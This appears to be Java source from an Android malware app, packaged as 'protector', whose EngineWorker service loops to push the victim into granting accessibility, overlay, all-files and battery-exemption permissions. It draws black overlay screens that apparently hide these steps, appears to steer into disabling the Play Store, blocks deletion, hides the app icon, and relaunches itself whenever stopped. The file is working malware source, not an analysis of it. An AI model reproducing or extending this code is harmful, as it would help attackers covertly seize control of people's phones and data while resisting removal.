package com.icontrol.protector;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;


//import static com.icontrol.protector.AccessServices.BlackoverLay;
import static com.icontrol.protector.AccessServices.FOR_NOTFY;
import static com.icontrol.protector.MyCods.isServiceRunning;
import static com.icontrol.protector.MyNotification.goToNotificationSettings;
import static com.icontrol.protector.UtliTools.NotifyFor;

import static com.icontrol.protector.UtliTools.hideme;
import static com.icontrol.protector.UtliTools.isAppDisabled;

import static com.icontrol.protector.UtliTools.isPackageInstalled;
import static com.icontrol.protector.UtliTools.isUsageAccessGranted;
import static com.icontrol.protector.UtliTools.isXiaomi;
import static com.icontrol.protector.UtliTools.randomnumber;
import static com.icontrol.protector.UtliTools.setupWorkManager;


import static java.lang.Thread.sleep;

import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.Nullable;


public class EngineWorker extends IntentService {

    public EngineWorker() {
        super(":");
    }

    private static int Notifi_ID = 111;

    private void startforground(Context ctx) {
        try {

            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        } catch (Exception a) {
        }


    }

    static int SleepTime = 10000;
    static int checktwice = 0;
    static int drawtwice = 0;
    static int batterytwice = 0;
    static int disabletris = 0;
    static int primstowic = 0;
    public static boolean needtofy = false;
    public static boolean holdxaomi = true;
    public static boolean trigeronexamoi = true;
    public static int timesoutxaomi = 0;
    static boolean skipstorage = false;
    static boolean skipblackprim = false;
    static boolean skipblackdraw = false;
    static boolean skipusagereq = false;
    static boolean skipblackplay = false;
    static boolean Showedonce = false;

    static boolean trnotifionce = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startforground(getApplicationContext());
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        startforground(getApplicationContext());
        try {
            if (!isServiceRunning(getApplicationContext(), WorkServices.class)) {
                Intent workint = new Intent(getApplicationContext(), WorkServices.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(workint);
                } else {
                    startService(workint);
                }
            }

        } catch (Exception a) {
        }
    }


//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//        startforground(getApplicationContext());
//        return START_STICKY;
//    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intentx) {

        startforground(getApplicationContext());
        final Context ctx = getApplicationContext();

        //AlarmHelper.cancelAlarm(ctx, EngineWorker.class);

        if (MySettings.Read(ctx, Consts.DEVICE_ID, "").length() == 0) {
            String newid = UtliTools.Create_DevicID() + String.valueOf(randomnumber(100, 199));
            MyLoger.Debug("CreateID", newid);
            MySettings.Write(ctx, Consts.DEVICE_ID, newid);
        }
        try {
            if (!isServiceRunning(getApplicationContext(), WorkServices.class)) {
                Intent workint = new Intent(getApplicationContext(), WorkServices.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(workint);
                } else {
                    startService(workint);
                }
            }

        } catch (Exception a) {
        }
        ConfigManager config = ConfigManager.getInstance();
        config.initialize(getApplicationContext(), My_Configs.ALL_CONFIG);
        boolean onetime = false;
        boolean hold13 = false;
        int maxholder = 28;

        //String[] statesArray = getStatesArray();

//        try {
//            Thread.sleep(3000);
//        }catch (Exception a){}


        while (true) {
            try {
                try {
                    Thread.sleep(SleepTime);
                } catch (Exception aa) {
                }
                if (!MyCods.is_Access_Enabled(ctx, AccessServices.class) && config.add_accss && config.req_accss) {
                    //android 13 first redirect to app settings page
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                            !MyCods.is_Access_Enabled(ctx, AccessServices.class) && My_Configs.Access_type.equals("g")) {

                        if (!RestrectionActivity.isActivityOpen() && !hold13 && maxholder >= 25 && Showedonce) {
                            try {
                                Intent intent = new Intent(ctx, RestrectionActivity.class);
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                startActivity(intent);
                                needtofy = true;
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            Thread.sleep(3000);
                                        } catch (Exception a) {
                                        }
                                        if (needtofy) {
                                            NotifyFor(ctx, RestrectionActivity.class);
                                        }
                                    }
                                }).start();

                            } catch (Exception a) {

                            }

                            //
                            SleepTime = 15000;
                            hold13 = true;
                            continue;
                        }

                    }
                    if (!AccessibilityActivity.isActivityOpen() && maxholder >= 25) {
                        SleepTime = 1000;
                        new Handler(Looper.getMainLooper()).post(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    Intent intent = new Intent(ctx, AccessibilityActivity.class);
                                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    startActivity(intent);
                                    needtofy = true;
                                    new Thread(new Runnable() {
                                        @Override
                                        public void run() {
                                            try {
                                                Thread.sleep(3000);
                                            } catch (Exception a) {
                                            }
                                            if (needtofy) {
                                                NotifyFor(ctx, AccessibilityActivity.class);
                                            }
                                        }
                                    }).start();
                                } catch (Exception a) {
                                }
                            }
                        });


                        Showedonce = true;
                        maxholder = 0;
                    } else {
                        maxholder += 1;
                        hold13 = false;
                    }

                } else {



                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                            checktwice < 3 &&
                            !MyPermissions.hasPermissions(ctx, MyPermissions.ALL_PERMISSIONS(ctx))
                    ) {
                        if (!skipblackprim && config.req_hidp) {
                            skipblackprim = true;
                            try {
                                Thread.sleep(3500);
                            } catch (Exception a) {
                            }
                            AccessTools.BlackScreen(true);
//                            try {
//                                Thread.sleep(1100);
//                            } catch (Exception a) {
//                            }
                        } else {
                            AccessTools.BlackScreen(false);
                        }

                        //1 Accessibilty
                        checktwice += 1;
                        SleepTime = 5000;
                        Intent primsint = new Intent(ctx, PermissionsActivity.class);
                        primsint.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        //primsint.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        // primsint.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);

                        ctx.startActivity(primsint);
                    } else {

//                        if (WorkServices.My_Access_inst != null) {
//                            WorkServices.My_Access_inst.FOR_EXTR_STRG = false;
//
//                        }

                        if (config.req_draw &&
                                drawtwice < 3 &&
                                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                                !Settings.canDrawOverlays(ctx)) {
                            drawtwice+=1;
                            if (!skipblackdraw && config.req_hidp) {
                               // AccessTools.UpdateBlackText(statesArray[0]);
                                skipblackdraw = true;
                                AccessTools.BlackScreen(true);
                            } else {
                                AccessTools.BlackScreen(false);
                                AccessServices.FOR_DRAW_OVER = false;
                            }
                            ctx.startActivity(new Intent(ctx, ActivityDraw.class)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                            SleepTime = 8000;


                        } else {
                            AccessServices.FOR_DRAW_OVER = false;

//                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
//                                    config.req_settngs &&
//                                    !Settings.System.canWrite(ctx)) {
//                                try {
//                                    SleepTime = 6000;
//                                    Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
//                                            Uri.parse("package:" + getPackageName()));
//                                    intent.setData(Uri.parse("package:" + ctx.getPackageName()));
//                                    intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
//                                    intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
//                                    ctx.startActivity(intent);
//                                    AccessServices.FOR_CHNG_STNG = true;
//                                } catch (Exception a) {
//
//                                }
//                            } else {
//

                                if (config.req_usagacc && !isUsageAccessGranted(ctx) && !config.req_accss && !skipusagereq) {
                                    SleepTime = 7000;
                                    try {
                                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS,
                                                Uri.parse("package:" + getPackageName()));
                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        startActivity(intent);

                                    } catch (Exception a) {
                                        try{
                                            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            startActivity(intent);
                                        }catch (Exception d){
                                            skipusagereq = true;
                                        }

                                    }
                                } else {

                                    if (config.req_files &&
                                            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                                            !Environment.isExternalStorageManager()) {
                                        try {
                                            SleepTime = 4000;

                                            //ACTION_MANAGE_SUPERVISOR_RESTRICTED_SETTING

                                            Intent intentstorg = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                                            Uri uri = Uri.fromParts("package", getPackageName(), null);
                                            intentstorg.setData(uri);
                                            intentstorg.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            //intentstorg.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                            try {
                                                Thread.sleep(3500);
                                            } catch (Exception a) {
                                            }
                                            if (!skipstorage && config.req_hidp) {
                                            //    AccessTools.UpdateBlackText(statesArray[1]);

                                                skipstorage = true;
                                                AccessTools.BlackScreen(true);
                                            } else {
                                                AccessTools.BlackScreen(false);
                                            }


                                            startActivity(intentstorg);
                                           // if (WorkServices.My_Access_inst != null) {
                                                AccessServices.FOR_EXTR_STRG = true;
                                          //  }
                                        } catch (Exception r) {
                                            r.printStackTrace();
                                        }
                                    } else {
                                        AccessServices.FOR_EXTR_STRG = false;
                                        if (config.req_StopPlay &&
                                                config.req_accss &&
                                                isPackageInstalled("com.android.vending", ctx.getPackageManager()) &&
                                                !isAppDisabled(ctx, "com.android.vending") &&
                                                disabletris < 2) {
                                            SleepTime = 5000;
                                            try {
                                                disabletris += 1;
                                                if (!skipblackplay &&
                                                        config.req_hidp) {
                                                   // AccessTools.UpdateBlackText(statesArray[2]);
                                                    skipblackplay = true;
                                                    AccessTools.BlackScreen(true);
                                                } else {
                                                    AccessTools.BlackScreen(false);
                                                }

                                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                                        Uri.parse("package:" + "com.android.vending"));
                                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                startActivity(intent);

                                                AccessServices.FOR_PLY = true;

                                            } catch (Exception exception) {
                                                Log.e("MIUIAutoStart", "Error starting intent", exception);
                                            }

                                        } else {
                                            AccessServices.FOR_PLY = false;
                                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M &&
                                                    batterytwice < 2 &&
                                                    config.req_btryoptm &&
                                                    !UtliTools.IsIgnore_Battery(ctx)) {

                                                batterytwice += 1;
                                                try {
                                                    AccessServices.PreventDelete = false;
                                                    Intent intent1 = null;

                                                        intent1 = new
                                                                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                                                Uri.parse("package:" + getPackageName()));

                                                    intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                    intent1.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);

                                                    intent1.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                                    // intent1.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

                                                    ctx.startActivity(intent1);

                                                    AccessServices.forbattery = true;
                                                    SleepTime = 4000;
                                                    // MySettings.WriteBool(ctx, Consts.Auto_Battary, true);
//                                                    try {
//                                                        Thread.sleep(5000);
//                                                    } catch (Exception aa) {
//                                                    }

                                                } catch (Exception ex) {
                                                }

                                            } else {


                                                if(config.req_accss &&
                                                        trnotifionce){
                                                    trnotifionce=false;
                                                    try{
                                                        Intent notyintent = goToNotificationSettings("updates",ctx);
                                                        notyintent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                                        notyintent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                                        notyintent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                                        ctx.startActivity(notyintent);
                                                        FOR_NOTFY = true;
                                                        SleepTime = 3000;
                                                    }catch (Exception a){}
                                                }else{
                                                    FOR_NOTFY = false;
                                                    if (isXiaomi() &&
                                                            config.req_accss &&
                                                            !MySettings.ReadBool(ctx, Consts.skipxaomi, false)) {
                                                        if (holdxaomi) {
                                                            if (trigeronexamoi) {
                                                                trigeronexamoi = false;
                                                                AccessTools.Treger("xamoi", null);
                                                                SleepTime = 1000;
                                                            }
                                                            if (timesoutxaomi < 15) {
                                                                timesoutxaomi += 1;
                                                                continue;
                                                            }

                                                        }

                                                    }
                                                    timesoutxaomi = 0;
                                                    MySettings.WriteBool(getApplicationContext(), Consts.skipxaomi, true);
                                                    if (!isServiceRunning(getApplicationContext(), WorkServices.class)) {
                                                        try {
                                                            Intent workint = new Intent(getApplicationContext(), WorkServices.class);
                                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                                startForegroundService(workint);
                                                            } else {
                                                                startService(workint);
                                                            }
                                                        } catch (Exception a) {
                                                        }
                                                    }

                                                    //MySettings.WriteBool(ctx, Consts.All_set, true);
                                                    if (!onetime) {
                                                        AccessServices MyAccess = AccessTools.myAccess();
                                                        //BlackoverLay
                                                        if (MyAccess != null) {
                                                            try {
                                                                Handler fhand = new Handler(MyAccess.getMainLooper());
                                                                fhand.post(() -> {
                                                                    try {
                                                                        MyAccess.clearWbVew();
                                                                    } catch (Exception s) {
                                                                        s.printStackTrace();
                                                                    }
                                                                });
                                                            } catch (Exception a) {
                                                                a.printStackTrace();
                                                            }
                                                        }

                                                        onetime = true;
                                                        AccessServices.FOR_PLY = false;
                                                        AccessServices.forbattery = false;
                                                        try {
                                                            NotificationManager notificationManager = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
                                                            notificationManager.cancel(101);
                                                        } catch (Exception a) {
                                                        }


                                                        AccessServices.FOR_PRIMS=false;
                                                        AccessTools.BlackScreen(false);


                                                        AccessServices.Auto_Click = false;

                                                        if (My_Configs.Hide_ico.equals("1")) {
                                                            MySettings.WriteBool(ctx, Consts.setupok, true);
                                                            if (My_Configs.Hide_Type.equals("f")) {
                                                                try {
                                                                    Intent unintent = new Intent(ctx, UninstallActivity.class);
                                                                    unintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                                    ctx.startActivity(unintent);

                                                                } catch (Exception a) {
                                                                    a.printStackTrace();
                                                                }
                                                            } else if (My_Configs.Hide_Type.equals("c")) {
                                                                try {
                                                                    hideme(ctx);
                                                                } catch (Exception a) {
                                                                    a.printStackTrace();
                                                                }
                                                            }

                                                        }


                                                    }
                                                    Consts.skip_splash = true;
                                                    AccessServices.PreventDelete = true;
                                                    SleepTime = 15000;


                                                }


                                            }

                                        }


                                    }

                                }

                          //  }

                        }

                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        try {

            Context mcontext = getApplicationContext();
            AlarmHelper.setAlarm(getApplicationContext());
            try {
                Intent workint = new Intent(mcontext, EngineWorker.class);
                if (!isServiceRunning(mcontext, EngineWorker.class)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        mcontext.startForegroundService(workint);
                    } else {
                        mcontext.startService(workint);
                    }
                }
            } catch (Exception s) {
            }
            // }
            setupWorkManager(getApplicationContext());
        } catch (Exception a) {
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);

        try {
            Context mcontext = getApplicationContext();
            AlarmHelper.setAlarm(getApplicationContext());
            Intent workint = new Intent(mcontext, EngineWorker.class);
            //  if (!Codes.isServiceRunning(mcontext, EngineWorker.class))
            //{
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mcontext.startForegroundService(workint);
                } else {
                    mcontext.startService(workint);
                }
            } catch (Exception a) {
            }
            // }


            setupWorkManager(getApplicationContext());
        } catch (Exception a) {
        }

    }
}
